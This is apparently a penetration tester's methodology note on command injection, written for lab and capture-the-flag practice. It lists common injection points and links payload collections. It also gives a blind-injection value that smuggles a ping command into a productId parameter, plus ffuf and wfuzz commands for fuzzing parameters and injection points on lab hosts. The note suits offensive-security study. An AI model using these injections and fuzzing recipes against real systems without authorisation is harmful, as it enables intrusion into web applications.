<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands>
<https://github.com/payloadbox/command-injection-payload-list>
<https://youtu.be/nrvLJn7B5iI?t=326>

Automated tool:
<https://github.com/commixproject/commix>

++Essentially everytime you see a place that has a paramater, accepts user input, or has a functionality that seems like its running some sort of OS commands, then attempt command injection on it.++

Common places to find:
- Web application forms (e.g. login forms, search forms)
- Query parameters in URLs
- HTTP headers (e.g. User-Agent, Referer)
- Cookies
- File upload forms
- Any other location where user input is passed to the system shell or interpreter

In case of blind command injection example:

productId=1 & ping -c 4 10.13.31.108 #&storeId=1
(and on our kali we can see icmp traffic, so confirm we have command injection)
tcpdump -i tun0 icmp

Paramater fuzzing:
ffuf -u ‘[https://10.10.42.12/chat/blankpage.php?FUZZ=id](https://172.31.3.1/forum.chatlogs/chatlogs.php?FUZZ=id)’ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

Injection fuzzing:
`ffuf -u '<https://10.10.42.12/chat/blankpage.php?cmd=FUZZ>' -w /usr/share/seclists/Fuzzing/command-injection-commix.txt`

Authenticated post request Injection fuzzing:
`wfuzz -w command_injection.txt -c -u '<http://127.0.0.1/DVWA/vulnerabilities/exec/#'> -d 'ip=FUZZ&Submit=Submit' -L -b "PHPSESSID=st2hjp4hddi9ob16untqj62s65; security=low"`


`ffuf -u '<http://10.10.185.73/assets/php/search.php'> -w c2 -H 'Authorization: Basic cmFzY2FsOmR1c3R5MQ==' -d '{"target":"FUZZ"}' -X POST -x <http://127.0.0.1:8080>`
![unnamed_8e05558723284cf1bb8db6ff0debd831](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/Command%20injection/Command%20injection/{{notename}}-202605011742.png)
